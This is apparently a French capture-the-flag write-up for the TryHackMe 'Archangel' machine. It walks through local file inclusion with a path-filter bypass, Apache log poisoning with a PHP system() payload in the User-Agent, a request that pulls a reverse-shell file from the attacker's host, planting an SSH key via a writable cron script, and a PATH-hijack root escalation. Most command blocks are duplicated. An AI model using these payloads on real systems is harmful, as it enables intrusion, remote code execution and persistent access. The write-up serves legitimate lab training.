@@ -1,0 +1,519 @@
+Archangel
+
+   Lien
+
+   Ip de la machine utilisée : 10.10.131.113
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ nmap -Pn -sV -sC -p- 10.10.131.113
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 19:13 CET
+Nmap scan report for 10.10.131.113
+Host is up (0.040s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0
+)
+| ssh-hostkey:
+|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
+|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
+|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Wavefire
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap
+.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 45.58 seconds
+
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ nmap -Pn -sV -sC -p- 10.10.131.113
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 19:13 CET
+Nmap scan report for 10.10.131.113
+Host is up (0.040s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0
+)
+| ssh-hostkey:
+|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
+|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
+|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Wavefire
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap
+.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 45.58 seconds
+
+   On repère sur le site web que l'on a un nom de domaine :
+   mafialive.thm
+
+   On ajoute alors celui-ci avec l'IP du serveur dans notre fichier hosts
+   :
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ sudo sh -c "echo '10.10.131.113' mafialive.thm >> /etc/hosts"
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ sudo sh -c "echo '10.10.131.113' mafialive.thm >> /etc/hosts"
+
+   on trouve alors un flag en utilisant le nom de domaine :
+   befdb7efcb4305e2d89fefa697481924.png
+
+   on trouve alors un élément dans le fichier robots.txt :
+User-agent: *
+Disallow: /test.php
+User-agent: *
+Disallow: /test.php
+
+   une nouvelle page.
+
+   il y a un boutton, et lorsque l'on clique dessus, on est redirigé sur
+   cette URL :
+   http://mafialive.thm/test.php?view=/var/www/html/development_testing/mr
+   robot.php
+
+   Sachant que l'on est redirigé de cette façon, il est possible que l'on
+   puisse faire de la LFI (Local File Inclusion).
+
+   et donc, en trouvant la bonne manière de faire, on peut par exemple :
+   19275e5eb16288b5d3c3a35e115688fd.png
+   voir le contenu du fichier donnant tous les utilisateurs.
+   Cependant, on voit que l'URL que l'on doit utiliser est:
+   http://mafialive.thm/test.php?view=/var/www/html/development_testing/..
+   //..//..//..//etc/passwd
+
+   et on ne peut pas directement le faire depuis le ?view, donc on peut
+   assumer que l'on peut uniquement afficher les éléments à partir de
+   l'URL.
+
+   et donc, on peut afficher le contenu du user.txt :
+   2eeb4bc954c17853f5f19665160d5676.png
+
+   maintenant, j'ai du faire un peu de recherche :
+   En ce qui concerne l'astuce fournie par THM, elle indique que pour
+   exploiter la vulnérabilité LFI, il est nécessaire de visualiser le code
+   source du fichier PHP. Comme nous le savons déjà, il n'est pas possible
+   de voir le code source de PHP à moins d'être administrateur ou d'avoir
+   une mauvaise configuration du côté du serveur.
+
+   J'ai donc cherché sur Google comment voir le code source de PHP en
+   exploitant la vulnérabilité LFI. Après quelques minutes, j'ai trouvé
+   une information concrète. Il existe des Wrappers intégrés en PHP, qui
+   sont responsables de la gestion des tâches liées au protocole, comme le
+   téléchargement de données à partir d'un serveur web ou ftp, et de leur
+   exposition de manière à ce qu'elles puissent être gérées avec les
+   fonctions de flux de PHP.
+
+   L'un de ces blogs explique comment utiliser l'un de ces wrappers pour
+   lire le code de PHP à l'aide de LFI.
+
+   PHP:// est un wrapper qui permet d'accéder à différents flux
+   d'entrées/sorties. Nous utiliserons php://filter - il s'agit d'une
+   sorte de méta-enveloppe conçue pour permettre l'application de filtres
+   à un flux au moment de l'ouverture. Il y a plusieurs paramètres à ce
+   wrapper, nous utiliserons convert.base64-encode/resource= - Cela
+   convertira le fichier donné en encodage base64 et l'imprimera à
+   l'écran. Mais nous devons fournir la ressource que nous voulons lire
+   comme un nom de fichier index.php.
+
+   Comme nous savons déjà qu'il y a un fichier dans
+   /var/www/html/development_testing/ qui est mrrobot.php, essayons ce
+   wrapper sur lui.
+
+   et avec cette URL :
+   http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/r
+   esource=/var/www/html/development_testing/mrrobot.php
+   on a ça :
+   PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==
+
+   mais bon :
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ echo "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" | base64 -d
+<?php echo 'Control is an illusion'; ?>
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ echo "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" | base64 -d
+<?php echo 'Control is an illusion'; ?>
+
+   Donc ça signifie que le fichier mrrobot.txt ne fait qu'afficher un
+   texte, mais on peut essayer sur d'autres fichier, on sait qu'il y a un
+   fichier test.php :
+
+   et bingo :
+   CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC9
+   0aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKIC
+   AgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtb
+   C9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQi
+   PkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICA
+   gIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY2
+   9udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0c
+   nBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihp
+   c3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV
+   3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy
+   9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX
+   0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRz
+   IG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4
+   KPC9ib2R5PgoKPC9odG1sPgoKCg==
+
+   bon, maintenant, on décode :
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC
+90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYn
+V0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF
+90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2
+J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbG
+YxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgIC
+AgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgIC
+AgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0
+VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy
+9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndm
+lldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJz
+sKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg
+==" | base64 -d
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrro
+bot.php"><button id="secret">Here is a button</button></a><br>
+        <?php
+
+            //FLAG: thm{explo1t1ng_lf1}
+
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+            if(isset($_GET["view"])){
+            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view']
+, '/var/www/html/development_testing')) {
+                include $_GET['view'];
+            }else{
+
+                echo 'Sorry, Thats not allowed';
+                                                }
+        }
+        ?>
+    </div>
+</body>
+
+</html>
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC
+90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYn
+V0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF
+90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2
+J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbG
+YxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgIC
+AgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgIC
+AgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0
+VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy
+9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndm
+lldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJz
+sKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg
+==" | base64 -d
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrro
+bot.php"><button id="secret">Here is a button</button></a><br>
+        <?php
+
+            //FLAG: thm{explo1t1ng_lf1}
+
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+            if(isset($_GET["view"])){
+            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view']
+, '/var/www/html/development_testing')) {
+                include $_GET['view'];
+            }else{
+
+                echo 'Sorry, Thats not allowed';
+                                                }
+        }
+        ?>
+    </div>
+</body>
+
+</html>
+
+   et le voilà notre flag restant.
+
+   Encore de la recherche :
+   "
+   Très bien, nous avons le deuxième drapeau générique et le code php. Le
+   code dit (si j'ai bien compris) que la première condition est que le
+   paramètre que nous passons ne doit pas contenir la chaîne "../../" et
+   qu'une autre condition est que le paramètre doit contenir la chaîne
+   "/var/www/html/developing_testing". C'est à cause de cette première
+   condition que nous avons utilisé la technique "..//..//..//" pour la
+   contourner. Ainsi, lorsque ces deux conditions sont remplies, nous
+   pouvons exploiter la LFI et obtenir un shell inversé.
+
+   J'ai regardé la section hint, il y est question de "poison". J'ai
+   cherché LFI Poison sur Google et j'ai découvert la technique du "Log
+   Poisoning". Il y a plusieurs façons d'obtenir un shell inversé via
+   l'empoisonnement de logs. Mais, pour cette pièce, nous nous en
+   tiendrons à "Apache Log Poisoning".
+   "
+
+   Donc, on doit modifier notre user-agent :
+   f5986dd160c2fe537ee112d7e030f3be.png
+
+   Il faut donc à la fois que l'on modifie notre user-agent et que l'on
+   envoie des requêtes spécifiques au serveur. Dans ce but, on peut
+   récupérer les logs du serveur Apache et voir le résultat de la commande
+   que l'on a lancé.
+GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/ac
+cess.log&cmd=wget%20http://10.8.**.**:8000/rev.php HTTP/1.1
+Host: mafialive.thm
+User-Agent: <?php system($_GET['cmd']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/ac
+cess.log&cmd=wget%20http://10.8.**.**:8000/rev.php HTTP/1.1
+Host: mafialive.thm
+User-Agent: <?php system($_GET['cmd']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+   Avec ça, on envoie un fichier sur le serveur qui va nous permettre de
+   prendre le contrôle.
+
+   Ensuite, on nouvre un netcat sur notre machine et on a plus qu'à aller
+   sur le fichier qu'on a déposé.
+www-data@ubuntu:/$ cat /home/archangel/user.txt
+cat /home/archangel/user.txt
+thm{lf1_t0_rc3_1s_tr1cky}
+www-data@ubuntu:/$ cat /home/archangel/user.txt
+cat /home/archangel/user.txt
+thm{lf1_t0_rc3_1s_tr1cky}
+
+   On voit ensuite, que l'on a une tâche cron :
+www-data@ubuntu:/etc/cron.weekly$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   archangel /opt/helloworld.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --repor
+t /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --repor
+t /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --repor
+t /etc/cron.monthly )
+#
+www-data@ubuntu:/etc/cron.weekly$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   archangel /opt/helloworld.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --repor
+t /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --repor
+t /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --repor
+t /etc/cron.monthly )
+#
+
+   et on peut écrire dans le fichier, donc on peut mettre une clé ssh dans
+   le fichier de archangel afin de pouvoir se conencter directement sur le
+   serveur, on modifie le fichier comme suit :
+#!/bin/bash
+mkdir -p /home/archangel/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg/KqsSvn87pqIqbPzKOHSyh44AqimIva8sB
+w3F+EBUigLb3xjbKs9SBLbloL7M5VuzZwM+bL2i1vJPNtUMZAbJ+hzEY9ijQEWopKgDEuR3zCDd6r5St
++QDqqH/14yAzEZqBa6+eURx9kfYsKKaCoue1b7LCaXaO6JYA1s4UIIF+xUeUzJw3nxw5TzbvkCtamYKI
+pTvUu7tQQLpNw+em58FcYj4ciIUoDxBI6VpnmY06JbGoyphrsRTVW4kRTO0eSEcrrGFVOqbbLmWWhI2g
+QcHL2nUTcIfSxLGKD3ave5tlCdd8mRmZr5BP/m4BCS21qS9owAt/6tgeZspQ2lVOBChcYlyLBf2TrNmZ
+TEb3mA5EwQdepeIofOavp7bEt2SguEQbNL27MFgTkHrQgOT+aelB8IvjXuQRxTePoq+zdJ4TT1hN1trs
+LvplzJhLwR53s83bfR+TEDoy0DzoPNt9WKzoom9tL0P9esdePB2W9hX35IKZVtD53kcT6xDO+m7pk= k
+ali@kali" >> /home/archangel/.ssh/authorized_keys
+#!/bin/bash
+mkdir -p /home/archangel/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg/KqsSvn87pqIqbPzKOHSyh44AqimIva8sB
+w3F+EBUigLb3xjbKs9SBLbloL7M5VuzZwM+bL2i1vJPNtUMZAbJ+hzEY9ijQEWopKgDEuR3zCDd6r5St
++QDqqH/14yAzEZqBa6+eURx9kfYsKKaCoue1b7LCaXaO6JYA1s4UIIF+xUeUzJw3nxw5TzbvkCtamYKI
+pTvUu7tQQLpNw+em58FcYj4ciIUoDxBI6VpnmY06JbGoyphrsRTVW4kRTO0eSEcrrGFVOqbbLmWWhI2g
+QcHL2nUTcIfSxLGKD3ave5tlCdd8mRmZr5BP/m4BCS21qS9owAt/6tgeZspQ2lVOBChcYlyLBf2TrNmZ
+TEb3mA5EwQdepeIofOavp7bEt2SguEQbNL27MFgTkHrQgOT+aelB8IvjXuQRxTePoq+zdJ4TT1hN1trs
+LvplzJhLwR53s83bfR+TEDoy0DzoPNt9WKzoom9tL0P9esdePB2W9hX35IKZVtD53kcT6xDO+m7pk= k
+ali@kali" >> /home/archangel/.ssh/authorized_keys
+
+   après quelques minutes, on peut se connecter :
+kali@kali:/data/Archangel/files$ ssh archangel@mafialive.thm
+Warning: Permanently added the ECDSA host key for IP address '10.10.231.1' to th
+e list of known hosts.
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-123-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Fri Nov 20 15:21:35 2020
+archangel@ubuntu:~$ ll
+total 48
+drwxr-xr-x 7 archangel archangel 4096 Apr 26 14:13 ./
+drwxr-xr-x 3 root      root      4096 Nov 18 13:06 ../
+-rw-r--r-- 1 archangel archangel  220 Nov 18 00:48 .bash_logout
+-rw-r--r-- 1 archangel archangel 3771 Nov 18 00:48 .bashrc
+drwx------ 2 archangel archangel 4096 Nov 18 13:08 .cache/
+drwxrwxr-x 3 archangel archangel 4096 Nov 18 11:20 .local/
+drwxr-xr-x 2 archangel archangel 4096 Nov 18 01:36 myfiles/
+-rw-r--r-- 1 archangel archangel  807 Nov 18 00:48 .profile
+drwxrwx--- 2 archangel archangel 4096 Nov 19 20:41 secret/
+-rw-rw-r-- 1 archangel archangel   66 Nov 18 11:20 .selected_editor
+drwxrwxr-x 2 archangel archangel 4096 Apr 26 14:13 .ssh/
+-rw-r--r-- 1 archangel archangel   26 Nov 19 19:57 user.txt
+archangel@ubuntu:~$ cd secret/
+archangel@ubuntu:~/secret$ ll
+total 32
+drwxrwx--- 2 archangel archangel  4096 Nov 19 20:41 ./
+drwxr-xr-x 7 archangel archangel  4096 Apr 26 14:13 ../
+-rwsr-xr-x 1 root      root      16904 Nov 18 16:40 backup*
+-rw-r--r-- 1 root      root         49 Nov 19 20:41 user2.txt
+archangel@ubuntu:~/secret$ cat user2.txt
+thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
+kali@kali:/data/Archangel/files$ ssh archangel@mafialive.thm
+Warning: Permanently added the ECDSA host key for IP address '10.10.231.1' to th
+e list of known hosts.
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-123-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Fri Nov 20 15:21:35 2020
+archangel@ubuntu:~$ ll
+total 48
+drwxr-xr-x 7 archangel archangel 4096 Apr 26 14:13 ./
+drwxr-xr-x 3 root      root      4096 Nov 18 13:06 ../
+-rw-r--r-- 1 archangel archangel  220 Nov 18 00:48 .bash_logout
+-rw-r--r-- 1 archangel archangel 3771 Nov 18 00:48 .bashrc
+drwx------ 2 archangel archangel 4096 Nov 18 13:08 .cache/
+drwxrwxr-x 3 archangel archangel 4096 Nov 18 11:20 .local/
+drwxr-xr-x 2 archangel archangel 4096 Nov 18 01:36 myfiles/
+-rw-r--r-- 1 archangel archangel  807 Nov 18 00:48 .profile
+drwxrwx--- 2 archangel archangel 4096 Nov 19 20:41 secret/
+-rw-rw-r-- 1 archangel archangel   66 Nov 18 11:20 .selected_editor
+drwxrwxr-x 2 archangel archangel 4096 Apr 26 14:13 .ssh/
+-rw-r--r-- 1 archangel archangel   26 Nov 19 19:57 user.txt
+archangel@ubuntu:~$ cd secret/
+archangel@ubuntu:~/secret$ ll
+total 32
+drwxrwx--- 2 archangel archangel  4096 Nov 19 20:41 ./
+drwxr-xr-x 7 archangel archangel  4096 Apr 26 14:13 ../
+-rwsr-xr-x 1 root      root      16904 Nov 18 16:40 backup*
+-rw-r--r-- 1 root      root         49 Nov 19 20:41 user2.txt
+archangel@ubuntu:~/secret$ cat user2.txt
+thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
+
+   ensuite, on peut voir que le répertoire secret a un script qui a les
+   SUID, en utlisant strings, on peut voir que la commande cp est utilisée
+   :
+archangel@ubuntu:~/secret$ file backup
+backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamical
+ly linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f9
+57efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
+archangel@ubuntu:~/secret$ strings backup
+/lib64/ld-linux-x86-64.so.2
+setuid
+system
+
+[REDACTED]
+
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+
+[REDACTED]
+archangel@ubuntu:~/secret$ file backup
+backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamical
+ly linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f9
+57efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
+archangel@ubuntu:~/secret$ strings backup
+/lib64/ld-linux-x86-64.so.2
+setuid
+system
+
+[REDACTED]
+
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+
+[REDACTED]
+
+   et vu que le script n'utilise pas le chemin entier de cp, on peut
+   simplement mettre le notre dans le PATH :
+archangel@ubuntu:~/secret$ cat > cp << EOF
+> #!/bin/bash
+> /bin/bash -i
+> EOF
+archangel@ubuntu:~/secret$ chmod +x cp
+archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
+archangel@ubuntu:~/secret$ cat > cp << EOF
+> #!/bin/bash
+> /bin/bash -i
+> EOF
+archangel@ubuntu:~/secret$ chmod +x cp
+archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
+
+   et maintenant, lorsque l'on exécute le script, on devient root :
+archangel@ubuntu:~/secret$ ./backup
+root@ubuntu:~/secret# id
+uid=0(root) gid=0(root) groups=0(root),1001(archangel)
+root@ubuntu:~/secret# cd /root/
+root@ubuntu:/root# ll
+total 28
+drwx------  4 root root 4096 Nov 20 15:22 ./
+drwxr-xr-x 22 root root 4096 Nov 16 15:39 ../
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Nov 18 13:06 .cache/
+drwxr-xr-x  3 root root 4096 Nov 16 19:27 .local/
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   68 Nov 19 19:59 root.txt
+root@ubuntu:/root# cat root.txt
+thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
+archangel@ubuntu:~/secret$ ./backup
+root@ubuntu:~/secret# id
+uid=0(root) gid=0(root) groups=0(root),1001(archangel)
+root@ubuntu:~/secret# cd /root/
+root@ubuntu:/root# ll
+total 28
+drwx------  4 root root 4096 Nov 20 15:22 ./
+drwxr-xr-x 22 root root 4096 Nov 16 15:39 ../
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Nov 18 13:06 .cache/
+drwxr-xr-x  3 root root 4096 Nov 16 19:27 .local/
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   68 Nov 19 19:59 root.txt
+root@ubuntu:/root# cat root.txt
+thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
